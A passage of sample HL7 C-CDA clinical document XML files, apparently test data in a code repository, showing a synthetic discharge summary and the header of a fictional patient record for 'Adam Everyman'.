					<!-- Discharge Medications Section (entries required) (V3) -->
					<templateId root="2.16.840.1.113883.10.20.22.2.11.1" extension="2015-08-01" />
					<templateId root="2.16.840.1.113883.10.20.22.2.11.1" />
					<code code="10183-2" displayName="Hospital Discharge Medications"
												codeSystem="2.16.840.1.113883.6.1"
												codeSystemName="LOINC">
						<translation code="75311-1" displayName="Discharge Medications"
													codeSystem="2.16.840.1.113883.6.1"
													codeSystemName="LOINC"/>
					</code>
					<title>Discharge Medications</title>
					<text>No Information</text>
				</section>
			</component>			

			<!-- ***************** PROBLEM LIST *********************** -->
			<!-- Problem examples -->		
			<component>
				<!-- An example of how to use a qualifier. This example shows presence of a problem/value/translation, although it could also be used to refine the problem/value -->
				<!-- The use of qualifiers could also be used on other sections, such as qualifying a procedure -->
				<!-- An example of how to use a qualifier. This example shows presence of a problem/value/translation, although it could also be used to refine the problem/value -->
				<!-- The use of qualifiers could also be used on other sections, such as qualifying a procedure -->
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.5.1" extension="2015-08-01"/>
					<code code="11450-4" codeSystem="2.16.840.1.113883.6.1" displayName="Problem List"/>
					<title>Problem List</title>
					<text>
						<table>
							<thead>
								<tr>
									<th>Name</th>
									<th>Dates</th>
									<th>Location/Qualifier</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<tr ID="Problem14">
									<td ID="ProblemDescription14">Below Knee Amputation</td>
									<td>
										<content>Onset: Apr 2 2014</content>
									</td>
									<td>Left</td>
									<td>Active</td>
								</tr>
								<tr ID="Problem1">
									<td ID="Problem1Value">Community Acquired Pneumonia</td>
									<td>Onset: February 27 2014</td>
									<td>Active</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry>
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.3" extension="2015-08-01"/>
							<id root="e5fbc288-659f-4aeb-a5e1-eb7cc8fcdfaf" />
							<code code="CONC" codeSystem="2.16.840.1.113883.5.6" />
							<!-- While clinicians can track resolved problems, generally active problems will have active concern status and resolved concerns will be completed -->
							<statusCode code="active" />
							<effectiveTime>
								<!-- This represents the time that the clinician began tracking the concern. This may frequently be an EHR timestamp-->
								<low value="20140403124536-0500" />
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2015-08-01"/>
									<id root="ac416033-3cc1-4485-ab31-36ce7669f55c" />
									<code codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" code="55607006" displayName="Problem">
										<translation code="75326-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Problem"/>
									</code>
									<text>
										<reference value="#Problem14" />
									</text>
									<statusCode code="completed" />
									<effectiveTime>
										<!-- This represents the date of biological onset. This can be before the patient vistited the clinician, as illustrated in this example-->
										<low value="20140402" />
									</effectiveTime>
									<!-- This is a SNOMED code as the primary vocabulary for problem lists. It would be preferable to have a SNOMED code but no direct translation is available here. -->
									<value xsi:type="CD" nullFlavor="OTH">
										<originalText>
											<reference value="#ProblemDescription14" />
										</originalText>
										<translation xsi:type="CD" code="V49.75" codeSystem="2.16.840.1.113883.6.103" codeSystemName="ICD-9" displayName="Below Knee Amputation Status" />
									</value>
									<targetSiteCode xsi:type="CD" code="30021000" codeSystem="2.16.840.1.113883.6.96" displayName="Structure of lower extremity from knee to ankle">
										<!-- This is an example of a qualifer which would affect a quality measure (e.g. cms 123 Diabetes Foot Exam) -->
										<!-- a qualifier may be a child element to <value> or <translation>. Here we use translation since it refines an ICD-9 code-->
										<qualifier>
											<name code="272741003" codeSystem="2.16.840.1.113883.6.96" displayName="Laterality" />
											<value code="7771000" codeSystem="2.16.840.1.113883.6.96" displayName="Left"/>
										</qualifier>
									</targetSiteCode>
								</observation>
							</entryRelationship>
						</act>
					</entry>
					<entry>
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.3" />
							<templateId root="2.16.840.1.113883.10.20.22.4.3" extension="2015-08-01"/>
							<!-- Since this represents an element which has been imported from the original document 
			but may vary from original act, a different GUID is used to idenitfy  -->
							<id root="11526f79-94a3-4682-a969-0f3d039db732"/>
							<code code="CONC" codeSystem="2.16.840.1.113883.5.6"/>
							<statusCode code="active"/>
							<effectiveTime>
								<low value="20140302124536-0500"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" />
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2015-08-01"/>
									<!-- Since this represents an element which has been imported from the original document 
					but may vary from original observation, a different GUID is used to idenitfy  -->
									<id root="35e97377-b63b-4e6a-a53e-9cfb016bea0b"/>
									<code code="55607006" displayName="Problem"
						codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT">
										<translation code="75326-9" codeSystem="2.16.840.1.113883.6.1"
							codeSystemName="LOINC" displayName="Problem"/>
									</code>
									<text>
										<reference value="#Problem1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="20140227"/>
									</effectiveTime>
									<value xsi:type="CD" code="385093006" codeSystem="2.16.840.1.113883.6.96"
						codeSystemName="SNOMED CT" displayName="Community acquired pneumonia">
										<originalText>
											<reference value="#Problem1Value" />
										</originalText>
									</value>
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20140302124536"/>
										<assignedAuthor>
											<id extension="66666" root="2.16.840.1.113883.4.6"/>
											<code code="207RC0000X" codeSystem="2.16.840.1.113883.6.101"
								codeSystemName="NUCC" displayName="Allopathic &amp; Osteopathic Physicians; Internal Medicine, Cardiovascular Disease"/>
											<addr>
												<streetAddressLine>6666 StreetName St.</streetAddressLine>
												<city>Silver Spring</city>
												<state>MD</state>
												<postalCode>20901</postalCode>
												<country>US</country>
											</addr>
											<telecom value="tel:+1(301)666-6666" use="WP"/>
											<assignedPerson>
												<name>
													<given>Heartly</given>
													<family>Sixer</family>
													<suffix>MD</suffix>
												</name>
											</assignedPerson>
										</assignedAuthor>
									</author>
									<!-- This reference refers to the external document where the problem was documented -->
									<!-- It uses a template for externalDocument from the QRDA 1 3.1 Implementation Guide-->
									<reference typeCode="REFR">
										<externalDocument classCode="DOCCLIN" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.115" extension="2014-06-09" />
											<!-- This refers to the ClinicalDocument/id of the original document -->
											<id extension="TT661" root="2.16.840.1.113883.19.5.99999.1"/>							
											<code codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" code="34133-9" displayName="Summary of episode note" />
											<!-- While not required, there is a benefit of using <setId> and <versionNumber> as a secondary key on documents.   
							If the flow from a document source system or repository to a destination system is infrequent or  not able to guarantee 
							sequential transmission of  document revisions.  The setId and versionNumber pair are actually better for detecting which 
							new document revises a previous older version of that document.  -->
											<!-- If setId and versionNumber are not available or applicable, they may be omitted -->
											<setId root="004bb033-b948-4f4c-b5bf-a8dbd7d8dd40"/>
											<versionNumber value="1"/>
										</externalDocument>
									</reference>
									<!-- This reference refers to the observation within external document the where the problem was documented -->
									<!-- Other options are the use of reference/externalAct or reference/externalProcedures -->
									<reference typeCode="REFR">
										<externalObservation classCode="OBS" moodCode="EVN">
											<!-- This refers to the observation/id of the original observation -->
											<id extension="10241104348" root="1.3.6.1.4.1.22812.4.111.0.4.1.2.1"/>
											<code code="55607006" displayName="Problem" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT">
												<translation code="75326-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Problem"/>
											</code>
										</externalObservation>
									</reference>
								</observation>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>

			<!-- ************************ ENCOUNTERS *********************** -->
			<!-- No known encounters -->
			<component>
				<section nullFlavor="NI">
					<!-- *** Encounters section (entries required) (V3) *** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.22.1" extension="2015-08-01"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.22.1"/>
					<code code="46240-8" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="History of encounters"/>
					<title>ENCOUNTERS</title>
					<text>No Encounters</text>
				</section>
			</component>

			<!-- ************** PROCEDURES ***************** -->
			<!-- edited as per test doc - all of this data is directly relevant -db -->
			<!-- (NO) UDI section based off of 	https://github.com/brettmarquard/HL7-C-CDA-Task-Force-Examples/blob/master/No_Implanted_Devices.xml 
			-db -->
			<!-- ************** PROCEDURES and UDI ***************** -->
			<component>
				<!-- nullFlavor of NI indicates No Information.-->
				<section nullFlavor="NI">
					<templateId root="2.16.840.1.113883.10.20.22.2.7" extension="2014-06-09" />
					<!-- Procedures section template -->
					<code code="47519-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="PROCEDURES" />
					<title>Procedures</title>
					<text>No Information</text>
				</section>
			</component>


			<!-- ************** No UDI ***************** -->
			<component>
				<section>
					<!-- Medical equipment section -->
					<templateId root="2.16.840.1.113883.10.20.22.2.23" extension="2014-06-09"/>
					<code code="46264-8" codeSystem="2.16.840.1.113883.6.1" />
					<title>MEDICAL EQUIPMENT</title>
					<!-- Alternative text: Patient has no history of procedures with implantable devices'-->
					<!-- Alternative text: Patient has no implanted devices'-->
					<text>
						<paragraph ID="Proc2">Patient has no history of implantable devices</paragraph>
					</text>				
					<entry>
						<procedure classCode="PROC" moodCode="EVN" negationInd="true">
							<!-- Procedure Activity Procedure V2-->
							<templateId root="2.16.840.1.113883.10.20.22.4.14"/>
							<templateId root="2.16.840.1.113883.10.20.22.4.14" extension="2014-06-09"/>
							<id root="d5b614bd-01ce-410d-8728-e1fd01dcc72a" />
							<code code="71388002" codeSystem="2.16.840.1.113883.6.96"   
								displayName="Procedure"/>
							<text>
								<reference value="#Proc2"/>
							</text>
							<statusCode code="completed" />
							<effectiveTime nullFlavor="NA" />
							<participant typeCode="DEV">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.37"/>
									<!-- UDI is 'not applicable' since no procedure -->
									<id nullFlavor="NA" root="2.16.840.1.113883.3.3719"/>  
									<playingDevice>
										<code code="40388003" codeSystem="2.16.840.1.113883.6.96"   
											displayName="Implant"/>
									</playingDevice>
									<scopingEntity>
										<id root="2.16.840.1.113883.3.3719"/>
									</scopingEntity>
								</participantRole>
							</participant>	
						</procedure>
					</entry>
				</section>
			</component>


			<!-- ******************** IMMUNIZATIONS ********************* -->
			<!-- No immunizations -->
			<component>
				<section>
					<!-- *** Immunizations Section (entries required) (V2) *** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.2.1" extension="2014-06-09"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.2.1"/>
					<code code="11369-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="History of immunizations"/>
					<title>IMMUNIZATIONS</title>
					<text>No immunization history</text>
					<entry typeCode="DRIV">
						<!-- using negationInd="true" to signify that there are no known immunizations -->
						<substanceAdministration classCode="SBADM" moodCode="EVN" negationInd="true">
							<!-- ** Immunization Activity (V3) ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.52" extension="2015-08-01"/>
							<templateId root="2.16.840.1.113883.10.20.22.4.52"/>
							<id root="de10790f-1496-4729-8fe6-f1b87b6219f7"/>
							<statusCode code="active"/>
							<effectiveTime nullFlavor="NA"/>
							<routeCode nullFlavor="NA"/>
							<consumable>
								<manufacturedProduct classCode="MANU">
									<!-- ** Immunization Medication Information (V2) ** -->
									<templateId root="2.16.840.1.113883.10.20.22.4.54" extension="2014-06-09"/>
									<templateId root="2.16.840.1.113883.10.20.22.4.54"/>
									<manufacturedMaterial>
										<!-- there is no generic vaccine code and no known recommended way to do this - 
										leaving generic flu for now just as an example. Not sure if it makes more sense to apply a nullFlavor? -db -->
										<code nullFlavor="OTH">
											<!-- Optional original text -->
											<originalText>Vaccination</originalText>
											<translation code="71181003" displayName="vaccine"
												codeSystem="2.16.840.1.113883.6.96"
												codeSystemName="SNOMED CT"/>
										</code>
										<!-- NA since there is no immunization data -db -->
										<lotNumberText nullFlavor="NA"/>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
						</substanceAdministration>
					</entry>
				</section>
			</component>

			<!-- ************* VITAL SIGNS *************** -->
			<!-- No vital signs  -db -->
			<component>
				<section nullFlavor="NI">
					<templateId root="2.16.840.1.113883.10.20.22.2.4.1" extension="2015-08-01" />
					<code code="8716-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Vital signs" />
					<title>VITAL SIGNS</title>
					<text>No Recorded Vital Signs</text>
				</section>
			</component>

			<!-- ******************* SOCIAL HISTORY ********************* -->
			<!-- edited as per test doc - most of this data is directly relevant -db -->
			<component>
				<section>
					<!--  ** Social History Section (V3) ** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.17" extension="2015-08-01"/>
					<code code="29762-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Social History"/>
					<title>SOCIAL HISTORY</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Social History Observation</th>
									<th>Description</th>
									<th>Dates Observed</th>
								</tr>
							</thead>
							<tbody>								
								<tr>
									<td>Current Smoking Status</td>
									<td>Current every day</td>
									<td>July 22, 2015</td>
								</tr>
								<tr>
									<td ID="BirthSexInfo">Birth Sex</td>
									<td>Male</td>
									<td>July 22, 2015</td>
								</tr>
							</tbody>
						</table>
					</text>					
					<!-- Current Smoking Status - July 22, 2015 -db -->
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="EVN">
							<!-- ** Smoking Status - Meaningful Use (V2) ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.78" extension="2014-06-09"/>
							<templateId root="2.16.840.1.113883.10.20.22.4.78"/>
							<id extension="123456789" root="2.16.840.1.113883.19"/>
							<!-- code SHALL be 72166-2 for Smoking Status - Meaningful Use (V2) -db -->
							<code code="72166-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Tobacco smoking status NHIS"/>
							<statusCode code="completed"/>
							<!-- The effectiveTime reflects when the current smoking status was observed. -->
							<effectiveTime value="20150722"/>
							<!-- The value represents the patient's smoking status currently observed. -->
							<!-- Consol Smoking Status Meaningful Use2 SHALL contain exactly one [1..1] value (CONF:1098-14810), which SHALL be selected from ValueSet Current Smoking Status 2.16.840.1.113883.11.20.9.38 STATIC 2014-09-01 (CONF:1098-14817) -db -->
							<value xsi:type="CD" code="449868002" displayName="Smokes tobacco daily" codeSystem="2.16.840.1.113883.6.96"/>
						</observation>
					</entry>					
					<!-- removed Social history observation (V3) entry for "Alcoholic drinks per day" -db -->
					<!-- Add Birth Sex entry -->
					<entry>
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.200" extension="2016-06-01"/>
							<code code="76689-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Sex Assigned At Birth"/>
							<text>
								<reference value="#BirthSexInfo"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime value="20150722"/>
							<value code="M" codeSystem="2.16.840.1.113883.5.1" xsi:type="CD" displayName="Male"/>
						</observation>
					</entry>


				</section>
			</component>	

			<!-- ******************** RESULTS ************************ -->
			<!-- edited as per test doc - all of this data is directly relevant -db -->
			<component>
				<section nullFlavor="NI">
					<!-- Results Section (entries required) (V3) -->
					<templateId root="2.16.840.1.113883.10.20.22.2.3.1" extension="2015-08-01"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.3.1"/>
					<code code="30954-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="RESULTS"/>
					<title>RESULTS</title>
					<text>Laboratory Test: None needed. Laboratory Values/Results: No Lab Result data</text>
				</section>
			</component>			

			<!-- removed component Advance Directives as not required by test data -db -->

			<!-- removed component Family History as not required by test data -db -->

			<!-- removed component Functional Status as not required by test data (specific to 170.315(b)(1), (b)(2)) -db -->

			<!-- removed component Medical Equipment as not required by test data -db -->

			<!-- removed component Payers as not required by test data -db -->

			<!-- added Assessment -db -->			
			<!-- 
			********************************************************
			Assessment
			********************************************************
			-->
			<!-- edited as per test doc - all of this data is directly relevant -db -->
			<component>
				<section nullFlavor="NI">
					<!-- Assessment Section -db -->
					<!-- There is no R2.1 (or 2.0) version of Assessment Section, using R1.1 templateId only -db -->
					<templateId root="2.16.840.1.113883.10.20.22.2.8"/>
					<code codeSystem="2.16.840.1.113883.6.1" 
						 codeSystemName="LOINC" code="51848-0" 
						 displayName="Evaluation note"/>
					<title>ASSESSMENTS</title>
					<text>No assessment information</text>
				</section>
			</component>

			<!-- ******************* PLAN OF TREATMENT ********************** -->
			<!-- edited as per test doc - all of this data is directly relevant -db -->
			<component>
				<section>
					<!--  **** Plan of Treatment Section (V2) **** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.10" extension="2014-06-09"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.10"/>
					<code code="18776-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Plan of care note"/>
					<title>TREATMENT PLAN</title>
					<text>
						No Plan of treatment
					</text>
				</section>
			</component>

			<!-- Added Goals - original version from C-CDA_R2_Care_Plan.xml from R2.0 IG package.
			     There are no duplicated template Ids with extensions -
				 as there is only one version in existence for each section and entry listed -db -->
			<!-- 
                ********************************************************
                Goals
                ********************************************************
            -->
			<!-- edited as per test doc -db -->			
			<component>
				<section nullFlavor="NI">
					<!-- Goals Section -->
					<templateId root="2.16.840.1.113883.10.20.22.2.60"/>
					<code code="61146-7" displayName="Goals" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Goals Section</title>
					<text>No goal information</text>
				</section>
			</component>

			<!-- added Health Concerns -db -->
			<!-- Note: There is no R1.1 version of Health Concerns Section or Health Concern Act -
				 so there is only one templateId per section (they're NEW) -db -->
			<!-- updated as per ETF	https://github.com/brettmarquard/HL7-C-CDA-Task-Force-Examples/blob/master/No_Known_Health_Concerns.xml 
			-db -->
			<!-- 
			********************************************************
			Health Concerns
			********************************************************
			-->
			<!-- edited as per test doc -db -->					
			<component>
				<!-- This example records assertion of no concerns -->
				<section>
					<!-- Health Concerns Section (V2) (V1 was added as a NEW template in R2.0, V2 was updated in R2.1) -db -->
					<templateId root="2.16.840.1.113883.10.20.22.2.58" extension="2015-08-01"/>
					<code code="75310-3" displayName="Health Concerns Document"
						codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Health Concerns</title>
					<!--Including ID at text element is allowed -->
					<text ID="HealthConcern_1">No Known Health Concerns on 07/22/2015</text>
					<entry typeCode="COMP">
						<!-- negationInd=true indicates no known health concerns at the stated time-->
						<act classCode="ACT" moodCode="EVN" negationInd="true">
							<!-- There is no V1 version of this template -db -->
							<templateId root="2.16.840.1.113883.10.20.22.4.132" extension="2015-08-01"/>
							<id root="4eab0e52-dd7d-4285-99eb-72d32ddb195d"/>
							<code code="75310-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"
								displayName="Health Concern"/>
							<text>
								<reference value="#HealthConcern_1"/>
							</text>
							<!-- This Health Concern has a statusCode of concern because assertion is ongoing -->
							<statusCode code="active"/>
							<!-- The effective time is the date that the Health Concern started being followed - 
								this does not necessarily correlate to the onset date of the contained health issues-->
							<effectiveTime value="20150722"/>
							<!-- Time at which THIS “concern” began being tracked.-->
						</act>
					</entry>
				</section>
			</component>		

			<!-- 
			************************************
			HOSPITAL DISCHARGE INSTRUCTIONS
			************************************ 
			-->
			<component>
				<section>
					<!-- Hospital Discharge Instructions Section - no R2.1 version for this template -db -->
					<templateId
					  root="2.16.840.1.113883.10.20.22.2.41"/>
					<code
					  code="8653-8"
					  codeSystem="2.16.840.1.113883.6.1"
					  codeSystemName="LOINC"
					  displayName="Hospital Discharge instructions"/>
					<title>HOSPITAL DISCHARGE INSTRUCTIONS</title>
					<!-- Unstructured text field -->
					<text>
						<list
						  listType="ordered">
							<item>Appointments: Schedule an appointment with Dr Seven after 1 week. Follow up with Outpatient facility.</item>
							<item>In case of fever, take Tylenol as advised in plan of treatment.</item>
						</list>
					</text>
				</section>
			</component>				

			<!-- removed Reason for Referral -db -->	

			<!-- added Mental Status Section (V2) (used to be NEW in R2.0) 2.16.840.1.113883.10.20.22.2.56 as required by VDT inp test data -db -->
			<!-- 
			********************************************************
			Mental Status Section
			********************************************************
			-->		
			<component>
				<section nullFlavor="NI">
					<!-- note: the IG lists the wrong templateId in its example of this section, lists ...2,14 instead of 2.56 -db -->
					<!-- There is no R1.1 version of this template -db -->
					<templateId root="2.16.840.1.113883.10.20.22.2.56" extension="2015-08-01" />
					<!-- Mental Status Section -->
					<code code="10190-7" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Mental status Narrative" />
					<title>MENTAL STATUS</title>
					<text>No information</text>
				</section>	
			</component>

			<!-- added component Functional Status as required by test data -db -->
			<!-- 
			********************************************************
			FUNCTIONAL STATUS
			********************************************************
			-->			
			<component>				
				<section nullFlavor="NI">
					<!-- Functional Status Section (V2)-->
					<templateId root="2.16.840.1.113883.10.20.22.2.14" extension="2014-06-09"/>
					<!-- Functional Status Section -->
					<templateId root="2.16.840.1.113883.10.20.22.2.14"/>
					<code code="47420-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Functional status assessment note"/>
					<title>FUNCTIONAL STATUS</title>
					<text>No information</text>
				</section>
			</component>

			<!-- added Interventions -->
			<!-- 
			********************************************************
			INTERVENTIONS
			********************************************************
			-->

			<component>
				<section nullFlavor="NI">
					<templateId root="2.16.840.1.113883.10.20.21.2.3" extension="2015-08-01" />
					<code code="62387-6" displayName="Interventions Provided" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" />
					<title>Interventions Section</title>
					<text>No intervention information</text>
				</section>
			</component>

		</structuredBody>
	</component>
</ClinicalDocument>
</file>

<file path="sample_data/test_files/small/hl7/hl7-ccd-sample.xml">
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>
<!--

	Title: US_Realm_Header_Template
	Original Filename: US_Realm_Header_Template.xml
	Version: 1.0
	Revision History:
	01/31/2011 bam created
    07/29/2011 RWM modified

-->
<ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="urn:hl7-org:v3 http://xreg2.nist.gov:8080/hitspValidation/schema/cdar2c32/infrastructure/cda/C32_CDA.xsd"
 xmlns="urn:hl7-org:v3"
 xmlns:mif="urn:hl7-org:v3/mif">
	<!--

********************************************************

  CDA Header

********************************************************

	-->
	<realmCode code="US"/>
	<typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
	<!-- US General Header Template -->
	<templateId root="2.16.840.1.113883.10.20.22.1.1"/>
	<!-- *** Note:  The next templateId, code and title will differ depending on what type of document is being sent. *** -->
	<!-- conforms to the document specific requirements  -->
	<templateId root="2.16.840.1.113883.10.20.22.1.2"/>
	<id extension="999021" root="2.16.840.1.113883.19"/>
	<code codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" code="34133-9" displayName="Summarization of Episode Note"/>
	<title>Good Health Health Summary</title>
	<effectiveTime value="20050329171504+0500"/>
	<confidentialityCode code="N" codeSystem="2.16.840.1.113883.5.25"/>
	<languageCode code="en-US"/>
	<setId extension="111199021" root="2.16.840.1.113883.19"/>
	<versionNumber value="1"/>
	<recordTarget>
		<patientRole>
			<id extension="12345" root="2.16.840.1.113883.19"/>
			<!-- Fake ID using HL7 example OID. -->
			<id extension="111-00-1234" root="2.16.840.1.113883.4.1"/>
			<!-- Fake Social Security Number using the actual SSN OID. -->
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>17 Daws Rd.</streetAddressLine>
				<city>Blue Bell</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:(781)555-1212" use="HP"/>
			<!-- HP is "primary home" from HL7 AddressUse 2.16.840.1.113883.5.1119 -->
			<patient>
				<name use="L">
					<!-- L is "Legal" from HL7 EntityNameUse 2.16.840.1.113883.5.45 -->
					<prefix>Mr.</prefix>
					<given>Adam</given>
					<given qualifier="CL">Frankie</given>
					<!-- CL is "Call me" from HL7 EntityNamePartQualifier 2.16.840.1.113883.5.43 -->
					<family>Everyman</family>
				</name>
				<administrativeGenderCode code="M" codeSystem="2.16.840.1.113883.5.1" displayName="Male"/>
				<birthTime value="19541125"/>
				<maritalStatusCode code="M" displayName="Married" codeSystem="2.16.840.1.113883.5.2" codeSystemName="MaritalStatusCode"/>
				<religiousAffiliationCode code="1013" displayName="Christian (non-Catholic, non-specific)" codeSystemName="HL7 Religious Affiliation " codeSystem="2.16.840.1.113883.1.11.19185"/>
				<raceCode code="2106-3" displayName="White" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<ethnicGroupCode code="2186-5" displayName="Not Hispanic or Latino" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<guardian>
					<code code="GRFTH" displayName="Grandfather" codeSystem="2.16.840.1.113883.5.111" codeSystemName="HL7 Role code"/>
					<addr use="HP">
						<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
						<streetAddressLine>17 Daws Rd.</streetAddressLine>
						<city>Blue Bell</city>
						<state>MA</state>
						<postalCode>02368</postalCode>
						<country>US</country>
						<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
					</addr>
					<telecom value="tel:(781)555-1212" use="HP"/>
					<guardianPerson>
						<name>
							<given>Ralph</given>
							<family>Relative</family>
						</name>
					</guardianPerson>
				</guardian>
				<birthplace>
					<place>
						<addr>
							<state>MA</state>
							<postalCode>02368</postalCode>
							<country>USA</country>
						</addr>
					</place>
				</birthplace>
				<languageCommunication>
					<languageCode code="fr-CN"/>
					<modeCode code="RWR" displayName="Recieve Written" codeSystem="2.16.840.1.113883.5.60" codeSystemName="LanguageAbilityMode"/>
					<preferenceInd value="true"/>
				</languageCommunication>
			</patient>
			<providerOrganization>
				<id root="2.16.840.1.113883.19"/>
				<name>Good Health Clinic</name>
				<telecom use="WP" value="tel:(781)555-1212"/>
				<addr>
					<streetAddressLine>21 North Ave</streetAddressLine>
					<city>Burlington</city>
					<state>MA</state>
					<postalCode>02368</postalCode>
					<country>USA</country>
				</addr>
			</providerOrganization>
		</patientRole>
	</recordTarget>
	<author>
		<time value="20050329224411+0500"/>
		<assignedAuthor>
			<id extension="KP00017" root="2.16.840.1.113883.19.5"/>
			<addr>
				<streetAddressLine>21 North Ave.</streetAddressLine>
				<city>Burlington</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>USA</country>
			</addr>
			<telecom use="WP" value="tel:(555)555-1003"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedAuthor>
	</author>
	<dataEnterer>
		<assignedEntity>
			<id root="2.16.840.1.113883.19.5" extension="43252"/>
			<addr>
				<streetAddressLine>21 North Ave.</streetAddressLine>
				<city>Burlington</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>USA</country>
			</addr>
			<telecom use="WP" value="tel:(555)555-1003"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</dataEnterer>
	<informant>
		<assignedEntity>
			<id extension="KP00017" root="2.16.840.1.113883.19.5"/>
			<addr>
				<streetAddressLine>21 North Ave.</streetAddressLine>
				<city>Burlington</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>USA</country>
			</addr>
			<telecom value="tel:(555)555-1003"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</informant>
	<informant>
		<relatedEntity classCode="PRS">
			<!-- classCode PRS represents a person with personal relationship with the patient. -->
			<code code="SPS" displayName="SPOUSE" codeSystem="2.16.840.1.113883.1.11.19563" codeSystemName="Personal Relationship Role Type Value Set"/>
			<relatedPerson>
				<name>
					<given>Rose</given>
					<family>Everyman</family>
				</name>
			</relatedPerson>
		</relatedEntity>
	</informant>
	<custodian>
		<assignedCustodian>
			<representedCustodianOrganization>
				<id root="2.16.840.1.113883.19.5"/>
				<name>Good Health Clinic</name>
				<telecom value="tel:(555)555-1212" use="WP"/>
				<addr use="WP">
					<streetAddressLine>17 Daws Rd.</streetAddressLine>
					<city>Blue Bell</city>
					<state>MA</state>
					<postalCode>02368</postalCode>
					<country>USA</country>
				</addr>
			</representedCustodianOrganization>
		</assignedCustodian>
	</custodian>
	<informationRecipient>
		<intendedRecipient>
			<informationRecipient>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</informationRecipient>
			<receivedOrganization>
				<name>Good Health Clinic</name>
			</receivedOrganization>
		</intendedRecipient>
	</informationRecipient>
	<legalAuthenticator>
		<time value="20050329224411+0500"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="KP00017" root="2.16.840.1.113883.19"/>
			<addr>
				<streetAddressLine>21 North Ave.</streetAddressLine>
				<city>Burlington</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>USA</country>
			</addr>
			<telecom use="WP" value="tel:(555)555-1003"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</legalAuthenticator>
